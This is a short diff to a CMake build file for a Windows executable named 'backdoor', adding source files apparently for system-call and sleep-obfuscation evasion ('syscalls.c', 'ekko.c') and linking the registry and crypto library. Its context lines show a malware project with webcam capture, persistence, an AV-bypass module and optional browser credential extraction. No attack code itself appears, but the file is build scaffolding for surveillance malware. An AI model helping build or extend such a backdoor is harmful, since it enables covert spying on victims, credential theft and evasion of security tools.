@@ -30,6 +30,9 @@ add_executable(backdoor
     src/bypass.c
     src/troll.c
     src/scare.c
+    src/syscalls.c
+    src/ekko.c
+
 
     # Uncomment and add sqlite3.c when using browser credential extraction:
     # src/sqlite3.c
@@ -56,6 +59,7 @@ target_link_libraries(backdoor
     strmiids    # DirectShow GUIDs (webcam)
     ole32       # COM (webcam)
     shell32     # Shell API (SHGetFolderPath for persistence)
+    advapi32    # Advanced Windows API (Registry, Crypto, etc)
     # mfplat    # Media Foundation (alternative webcam - uncomment if using)
     # mf        # Media Foundation
     # mfreadwrite # Media Foundation
